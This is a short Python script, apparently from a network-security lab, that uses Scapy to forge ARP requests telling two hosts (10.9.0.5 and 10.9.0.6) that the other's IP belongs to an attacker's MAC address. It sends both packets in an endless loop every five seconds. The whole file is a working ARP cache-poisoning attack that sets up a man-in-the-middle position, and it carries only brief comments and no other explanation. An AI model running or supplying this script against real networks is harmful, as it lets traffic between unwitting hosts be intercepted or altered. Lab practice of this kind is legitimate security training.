#!/usr/bin/env python3
from scapy.all import *
E1 = Ether(dst = '02:42:0a:09:00:05', src='02:42:0a:09:00:69') #from attacker MAC to HostA MAC
E2 = Ether(dst = '02:42:0a:09:00:06', src='02:42:0a:09:00:69') #from attacker MAC to HostB MAC
#ARP(hwsrc="Attacker MAC", psrc="HostB IP", hwdst="HostA MAC" ,pdst="HostA IP")
A = ARP(hwsrc='02:42:0a:09:00:69', psrc='10.9.0.6', hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')#Constructs a ARP packet with B's IP mapped to attackers MAC address.
B = ARP(hwsrc='02:42:0a:09:00:69', psrc='10.9.0.5', hwdst='02:42:0a:09:00:06', pdst='10.9.0.6')#Constructs a ARP packet with A's IP mapped to attackers MAC address.

A.op = 1 # 1 for ARP request; 2 for ARP reply
B.op = 1 # 1 for ARP request; 2 for ARP reply

pktA = E1/A
pktB = E2/B

pktA.show()
pktA.show()

while(True):    
    sendp(pktA)
    sendp(pktB)
    time.sleep(5)
